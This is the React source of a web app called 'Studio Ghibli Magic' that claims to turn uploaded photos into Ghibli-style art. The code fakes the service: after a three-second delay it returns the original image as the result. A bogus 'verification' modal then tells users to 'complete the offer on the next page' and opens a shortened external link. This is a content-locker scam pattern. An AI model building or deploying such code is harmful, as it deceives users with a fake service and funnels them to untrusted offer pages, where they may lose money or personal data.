import { useState, useRef } from 'react';
import './App.css';
import beforeExample from './assets/before-example.jpg';
import afterExample from './assets/after-example.jpg';
import { FaUpload, FaMagic, FaRedo, FaDownload, FaShare, FaCheck, FaExclamationTriangle, FaArrowRight } from 'react-icons/fa';

function App() {
  const [originalImage, setOriginalImage] = useState(null);
  const [ghibliImage, setGhibliImage] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);
  const [showVerification, setShowVerification] = useState(false);
  const fileInputRef = useRef(null);

  const handleImageUpload = (event) => {
    setError(null);
    const file = event.target.files[0];
    
    if (!file) return;
    
    if (!file.type.match('image.*')) {
      setError('Please upload an image file (JPEG or PNG)');
      return;
    }
    
    if (file.size > 5 * 1024 * 1024) {
      setError('Image size should be less than 5MB');
      return;
    }
    
    const reader = new FileReader();
    reader.onload = (e) => {
      setOriginalImage(e.target.result);
      setGhibliImage(null);
    };
    reader.readAsDataURL(file);
  };

  const handleTransform = () => {
    if (originalImage) {
      setIsLoading(true);
      setTimeout(() => {
        setGhibliImage(originalImage);
        setIsLoading(false);
        setShowVerification(true);
      }, 3000);
    }
  };

  const handleVerification = () => {
    setShowVerification(false);
    window.open('https://smrturl.co/bbdafba', '_blank');
  };

  const resetAll = () => {
    setOriginalImage(null);
    setGhibliImage(null);
    setError(null);
    setShowVerification(false);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  return (
    <div className="app-container">
      <header className="app-header">
        <div className="header-content">
          <h1 className="app-title">Studio Ghibli Magic</h1>
          <p className="app-subtitle">Transform your photos into enchanting Ghibli-style artwork</p>
        </div>
      </header>

      <main className="app-main">
        <div className="main-content">
          <section className="guide-section">
            <h2 className="guide-title">How to Create Your Ghibli Masterpiece</h2>
            <div className="guide-steps">
              <div className="guide-step">
                <div className="step-number"><FaUpload className="step-icon" /></div>
                <p>Upload your image</p>
              </div>
              <div className="guide-step">
                <div className="step-number"><FaMagic className="step-icon" /></div>
                <p>Apply Ghibli Magic</p>
              </div>
              <div className="guide-step">
                <div className="step-number"><FaDownload className="step-icon" /></div>
                <p>Complete verification</p>
              </div>
            </div>

            <div className="example-section">
              <h3 className="example-title">See the Transformation</h3>
              <div className="example-images">
                <div className="example-item">
                  <h4>Before</h4>
                  <img src={beforeExample} alt="Before transformation" className="example-image" />
                </div>
                <div className="example-item">
                  <h4>After</h4>
                  <img src={afterExample} alt="After transformation" className="example-image" />
                </div>
              </div>
            </div>
          </section>

          <section className="upload-section">
            <div className="upload-card">
              <div className="upload-area">
                {originalImage ? (
                  <div className="image-preview-container">
                    <img 
                      src={originalImage} 
                      alt="Original" 
                      className="image-preview"
                    />
                  </div>
                ) : (
                  <div className="upload-instructions">
                    <div className="upload-icon">
                      <FaUpload size={48} />
                    </div>
                    <p>Click below to select an image</p>
                  </div>
                )}
                <input
                  type="file"
                  ref={fileInputRef}
                  accept="image/jpeg, image/png"
                  onChange={handleImageUpload}
                  className="file-input"
                  id="image-upload"
                />
                <label htmlFor="image-upload" className="upload-button">
                  {originalImage ? 'Change Image' : 'Select Image'}
                </label>
              </div>
            </div>
          </section>

          {originalImage && (
            <section className="action-section">
              <button 
                onClick={handleTransform} 
                className="transform-button"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <div className="three-dots">
                      <div className="dot"></div>
                      <div className="dot"></div>
                      <div className="dot"></div>
                    </div>
                    Applying Ghibli Magic...
                  </>
                ) : (
                  <>
                    <FaMagic /> Apply Ghibli Magic
                  </>
                )}
              </button>
              <button onClick={resetAll} className="reset-button">
                <FaRedo /> Start Over
              </button>
            </section>
          )}

          {error && (
            <div className="error-message">
              <FaExclamationTriangle /> {error}
            </div>
          )}

          {ghibliImage && (
            <section className="result-section">
              <h2 className="section-title">Your Ghibli Masterpiece</h2>
              <div className="comparison-container">
                <div className="comparison-item">
                  <h3>Original</h3>
                  <div className="image-container">
                    <img src={originalImage} alt="Original" className="result-image" />
                  </div>
                </div>
                <div className="comparison-item">
                  <h3>Ghibli Style</h3>
                  <div className="image-container">
                    <img 
                      src={ghibliImage} 
                      alt="Ghibli Style" 
                      className="result-image ghibli-effect" 
                    />
                  </div>
                </div>
              </div>
              <div className="download-options">
                <button className="download-button" onClick={() => setShowVerification(true)}>
                  <FaDownload /> Download
                </button>
                <button className="share-button">
                  <FaShare /> Share
                </button>
              </div>
            </section>
          )}
        </div>
      </main>

      <footer className="app-footer">
        <div className="footer-content">
          <p>© {new Date().getFullYear()} Studio Ghibli Magic</p>
        </div>
      </footer>

      {showVerification && (
        <div className="verification-modal">
          <div className="verification-content">
            <div className="verification-icon">
              <FaCheck />
            </div>
            <h3>Your Image is Ready!</h3>
            <p>To prevent abuse and ensure quality, please complete this quick verification to access your Ghibli artwork.</p>
            <div className="verification-steps">
              <div className="verification-step">
                <span>1</span> Click "Continue"
              </div>
              <div className="verification-step">
                <span>2</span> Complete the offer on the next page
              </div>
              <div className="verification-step">
                <span>3</span> Your download will start automatically
              </div>
            </div>
            <button className="verification-button" onClick={handleVerification}>
              Continue <FaArrowRight />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;